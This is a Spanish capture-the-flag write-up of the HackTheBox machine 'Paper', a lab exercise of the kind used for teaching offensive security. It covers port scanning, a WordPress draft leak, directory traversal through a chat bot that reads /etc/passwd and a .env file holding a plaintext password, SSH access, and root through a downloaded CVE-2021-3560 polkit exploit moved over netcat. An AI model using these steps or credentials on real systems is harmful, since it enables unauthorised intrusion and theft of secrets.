---
title: Paper WriteUp
date: 2023-03-16
categories: [WriteUps, Máquinas Linux]
tags: [CVE]
image:
  path: ../../assets/img/writeups/Paper/Paper.png
  width: 528
  height: 330
  alt: Banner Paper
---

Analizamos los puertos abiertos con nmap y encontramos el puerto 22, 80 y 443 abiertos. Los puertos web 80 y 443 resultan ser los mismos. No encontramos ninguna vulnerabilidad en ellos. Realizamos fuzzing en búsqueda de archivos y directorios, no encontramos nada. Después de esto toca averiguar subdominios, encontramos uno con la herramienta dirsearch. En este subdominio nos topamos ante un Wordpress de versión vulnerable. Conseguimos ver el chat de los trabajadores de la empresa, conseguimos credenciales para acceder por ssh. Obtenemos la flag de usuario.

Para la escalada lanzamos linpeas.sh y localizamos una vulnerabilidad en pwnkit. Mirando algún articulo para aprender sobre ella encuentro una más nueva, que es la CVE-2021-3560. Con ella escalo al usuario root y consigo su flag.

## Reconocimiento

Primero vamos hacer un ping a la máquina objetivo para comprobar que tenemos conectividad con ella. `Ip de la máquina: 10.10.11.143`:
```
❯ ping -c 1 10.10.11.143
PING 10.10.11.143 (10.10.11.143) 56(84) bytes of data.
64 bytes from 10.10.11.143: icmp_seq=1 ttl=63 time=48.8 ms

--- 10.10.11.143 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 48.774/48.774/48.774/0.000 ms
```

Al ser el ttl=63 , es decir, cercano a 64, podemos confirmar que estamos tratando con una máquina Linux. Recuerda que con un ttl cercano a 64 es propio de un GNU/Linux y un ttl cercano a 128 es propio de Windows.

Ahora toca realizar un escenaeo de los puertos de la máquina:

```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.143 -oG allPorts
```
Veamos lo que significan estas cuantas opciones:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.11.143 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts -> Exportará el output a un fichero grepeable que llamaremos "allPorts"

El resultado del escaneo es el siguiente:  
```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-11 19:14 CET
Initiating SYN Stealth Scan at 19:14
Scanning 10.10.11.143 [65535 ports]
Discovered open port 443/tcp on 10.10.11.143
Discovered open port 80/tcp on 10.10.11.143
Discovered open port 22/tcp on 10.10.11.143
Completed SYN Stealth Scan at 19:14, 16.92s elapsed (65535 total ports)
Nmap scan report for 10.10.11.143
Host is up, received user-set (0.070s latency).
Scanned at 2023-03-11 19:14:00 CET for 17s
Not shown: 63412 closed tcp ports (reset), 2120 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.13 seconds
           Raw packets sent: 84711 (3.727MB) | Rcvd: 68288 (2.732MB)
```

Ahora voy a realizar un escaneo de esos puertos abiertos para poder recoger más información.  
```
❯ nmap -p22,80,443 -sC -sV 10.10.11.143 -oN targeted
```
* -p  : Indica los puertos que quieres escanear  
* -sC : Lanza una serie de scripts básicos de reconocimiento.
* -sV : Lanza script que descubre la servicio y la versión que corren en esos puertos  
* -oN : Guarda el output en formato nmap a un fichero que llamaremos targeted


Y este sería el output del comando anterior: 
```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-11 19:30 CET
Nmap scan report for 10.10.11.143
Host is up (0.047s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
```

Según los resultados obtenidos tenemos tres puertos abiertos asociados a los siguientes servicios:  
* 22 : ssh
* 80 : http
* 443 : https

## Buscando vulnerabilidades

Al no tener credenciales para conectarnos por ssh voy a optar por los puertos 80 y 443 , es decir, via web.  
Lo primero que suelo hacer cuando me enfrento a una web es tirar de la herramienta **whatweb** para saber que tecnologías corren por detrás de la web. Whatweb es como un **Wappalyzer** -plugin de navegador que hace lo mismo- pero mediante la consola.

```
❯ whatweb http://10.10.11.143
http://10.10.11.143 [403 Forbidden] Apache[2.4.37][mod_fcgid/2.3.9], Country[RESERVED][ZZ], Email[webmaster@example.com], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], IP[10.10.11.143], MetaGenerator[HTML Tidy for HTML5 for Linux version 5.7.28], OpenSSL[1.1.1k], PoweredBy[CentOS], Title[HTTP Server Test Page powered by CentOS], UncommonHeaders[x-backend-server], X-Backend[office.paper]

❯ whatweb https://10.10.11.143
https://10.10.11.143 [403 Forbidden] Apache[2.4.37][mod_fcgid/2.3.9], Country[RESERVED][ZZ], Email[webmaster@example.com], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], IP[10.10.11.143], MetaGenerator[HTML Tidy for HTML5 for Linux version 5.7.28], OpenSSL[1.1.1k], PoweredBy[CentOS], Title[HTTP Server Test Page powered by CentOS]
```
Lanzo el whatweb tanto para el servicio http como el https, ambos me responden casi lo mismo, así deduzco que será lo mismo. Mejor, de esta manera tengo menos lugares donde buscar la vulnerabilidad.

Ahora voy a ojear las páginas web antes de realizar un fuzzing si hiciera falta.

![Web-1]({{ 'assets/img/writeups/Paper/Web-1.png' | relative_url }}){: .center-image }

Como preveía tanto la página de http como la de https sale el mismo resultado, el mostrado en la captura anterior.

No veo nada por donde pueda probar un ataque en la págna principal, no hay cuadros con opción de input para el usuario.  
Miro el código fuente de la página y tampoco. Voy a realizar un fuzzing con la herramiena wfuzz a ver si encuentro directorios o archivos por la web.

```
> wfuzz -c --hc=404 -t 100 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.143/FUZZ
```
* -c : Formato coloreado
* --hc : Hide code. Oculta páginas del código de respuesta indicado
* -t : Cantidad de hilos para usar
* -w : Diccionario

![Wfuzz]({{ 'assets/img/writeups/Paper/wfuzz.png' | relative_url }}){: .center-image }

Con esta primera búsqueda solo encontramos la página /manual, en la que no hay nada, es una página de ayuda del Servidor Apache.  
También pruebo a buscar ficheros txt y php con el siguiente comando, pero no encuentra nada:
```
> wfuzz -c --hc=404 -t 100 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,txt-php http://10.10.11.143/FUZZ/FUZ2Z
```

Puede que el servidor tenga Virtual Hosting y se alojen varias páginas en el mismo servidor. Es convención en máquinas de hackthebox que siga la estructura de NombreMáquina.htb, así que lo meto al /etc/host para que mi máquina sepa apuntar allí:
```
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot

10.10.11.143  paper.htb
```
Ahora en la url del navegador introduzco `http://paper.htb` y me sale la misma página web que antes.

No veo nah de nah, así que voy a volver a fuzzear esta vez con otra herramienta, que por defecto usa otro diccionario y además me parece chula. La herramienta es dirsearch.  
```
> dirsearch -u http://10.10.11.143 -x 403
```
* -u : url
* -x : oculta el código que le pongas, el 404 debe ocultarlo por defecto.

![Dirsearch]({{ 'assets/img/writeups/Paper/dirsearch.png' | relative_url }}){: .center-image }

Encuentra la ruta  `/.npm/anonymous-cli-metrics.json` que me llama la atención. Entro a esa ruta desde el navegador y ojeando un poco me encuetro lo que parece ser el subdominio office.paper

![Subdominio]({{ 'assets/img/writeups/Paper/encuentroSubdomi.png' | relative_url }}){: .center-image }

Añado ese subdominio al /etc/host  
```
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot

10.10.11.143  paper.htb office.paper
```
También podríamos haber encontrato ese subdominio con la herramienta nikto.  
```
nikto -host http://10.10.11.143
```
Entramos a ese subdominio encontrado desde el navegador, donde nos encontraremos, esta vez sí, una página diferente:

![Nueva-Web]({{ 'assets/img/writeups/Paper/NuevaWeb.png' | relative_url }}){: .center-image }

Esta página está basada en la serie The Ofice, me partí el culo con esta serie. Pero sigamos..  
Buscando por el código fuente y con el plugin de Wappalyzer descubrimos que es un WordPres. Pero desde el código fuente pude ver la versión justa, estoy ante un Wordpress 5.2.3. Antes de buscar si esta versión tiene alguna vulnerabilidad pública echo un vistazo rápido a la web. Encuentro un consejo a Michael: "Deberías eliminar el contenido "Secret" de tus borradores, no es tan seguro". Ahora si busco vulns de esa versión del Wordpress
```
searchsploit wordpress 5.2.3
```
Salen 5 resultados. Esto consiste en ojear e ir probando, pero con lo encontrado antes me da buena vibración la vulnerabilidad titulada "WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts":
```
So far we know that adding `?static=1` to a wordpress URL should leak its secret content
```

## Explotación

Añado en la url lo leído antes:
```
http://10.10.11.143/?static=1
```
Sale otro mensaje. Habla sobre un chat secreto y deja la URL;
`http://chat.office.paper/register/8qozr226AhkCHZdyY`  

Entramos a la url y sale un servicio de chat llamado rocket.chat. Y hay un registro. Me registro y puedo ver los chats de las trabajadoras.  
Un trabajador ha creado un bot al que se le pueden preguntar determinadas cosas , peeero no puedo escribir en el chat. Leyendo un poco más descubro que puedo escribir a su chat privado. Pruebo a preguntarle por archivos e intento concatenar algún comando.

![Recyclops]({{ 'assets/img/writeups/Paper/recyclopsChat.png' | relative_url }}){: .center-image }

Funciona en directory traversal. Lo siguiente es probar si tiene id_rsa algun usuario visto, el de dwight, pero no.

![id_rsa]({{ 'assets/img/writeups/Paper/listarid_rsa.png' | relative_url }}){: .center-image }

Sigamos intentando ver algo. Husmeo en el direcotorio home de dwight. Me llama la atención el directorio hubot, es raro de ver.

![Env]({{ 'assets/img/writeups/Paper/archivoEnv.png' | relative_url }}){: .center-image }

Encuentro un .env, en este tipo de archivos donde se encuentras las variables de entorno podemos ver contraseñas. Ahora con el comando en el chat; `recyclops file ../hubot/.env` podemos ver su contenido.

![Environment]({{ 'assets/img/writeups/Paper/contenidoEnv.png' | relative_url }}){: .center-image }

¡Encontramos credenciales!!
Usuario: recyclops
Contraseña: Queenofblad3s!23

Con estas credenciales probaremos a conectarnos por ssh a la máquina con algún usuario local encontrado antes en el /etc/passwd. Recuerda que recyclops no estaba como usuario, pero en cambio si que estaba el usuario dwight. Tendremos suerte en esto, sino hubiera tocado intentar conectarte al chat con las credenciales encontradas y seguir curioseando.

```
❯ ssh dwight@10.10.11.143
[dwight@paper ~]$ whoami
dwight
```
Cuando conecto por ssh, mejoro la consola poniendo esto:
```
> export TERM=xterm
```

Leamos la flag del usuario:
```
> cat user.txt
df73ce621ea5ec9ec***********
```
¡¡¡¡¡¡¡Primera flag conseguida!!!!!

## Escalada de privilegios

Primero realizo un id, para averiguar a que grupos pertenezco, pero nada interesante.
```
[dwight@paper ~]$ id
uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
```

Ahora compruebo si tengo previligios de sudo:
```
[dwight@paper ~]$ sudo -l
[sudo] password for dwight: 
Sorry, user dwight may not run sudo on paper.
[dwight@paper ~]$ 
```
Este usuario no corre sudo en la máquina.

Miro también si tengo archivos con suid, pero tampoco veo nada interesante:
```
[dwight@paper ~]$ find / \-perm -4000 2>/dev/null
/usr/bin/fusermount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/crontab
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/fusermount3
/usr/sbin/grub2-set-bootflag
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/userhelper
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
```
Toca mirar capabilities. Pero no veo nada vulnerable:
```
[dwight@paper ~]$ getcap -r / 2>/dev/null
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/mtr-packet = cap_net_raw+ep
/usr/libexec/mysqld = cap_sys_nice+ep
[dwight@paper ~]$ 

```
Como no encuentro nada voy a traerme Linpeas a la máquina víctima para así realizar un reconocimiento más a fondo de la máquina.

En máquina víctima:
```
> nc -nlvp 4448 > linpeas.sh
```
En mi máquina:
```
> wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

> nc 10.10.11.143 4448 < linpeas.sh

CTRL + C
```
Y lanzamos el linpeas:
```
> chmod +x linpeas.sh
> ./linpeas.sh
```
Esperamos a que finalice. Y vemos unos cuantos vectores por donde atacar.  

![Linpeas]({{ 'assets/img/writeups/Paper/linpeasBueno.png' | relative_url }}){: .center-image }


Aquí es ir probando, informarte y romperte la cabeza, cuanto más te la rompas más aprendes.

Empecé probando por el CVE-2022-2588 pero no había manera de que funcionará. Después de ese opté por el CVE-2021-4034 de Pwnkit:  
Buscando articulos mediante la búsqueda "pwnkit exploit" encuentro uno interesante y al final de este me señala que hay otro CVE más nuevo. El artículo es este: https://hackinglethani.com/es/pwnkit/  

Pienso "si hay un más nuevo quizás será mejor y hayan corregido fallos de anteriores CVE". Así que elijo el CVE-2021-3560.  
Utilizo este exploit: https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation

En máquina objetivo:
``` 
> nc -nlvp 4448 > poc.sh
```

En mi máquina:
```
> wget https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh

> nc 10.10.11.143 4448 < poc.sh
``` 
Ahora en máquina objetivo damos permisos de ejecución y ejecutamos el exploit:
```
> chmod +x poc.sh
> ./poc.sh
```
Lanzalo varias veces hasta que funcione.

![Root]({{ 'assets/img/writeups/Paper/root.png' | relative_url }}){: .center-image }

Y conseguimos la flag de root:
```
> cat /root/root.txt

c41a28abb69f64e**************
```
Este es mi primer Writeup, ser benévolos conmigo ;). Un saludito guapis.


















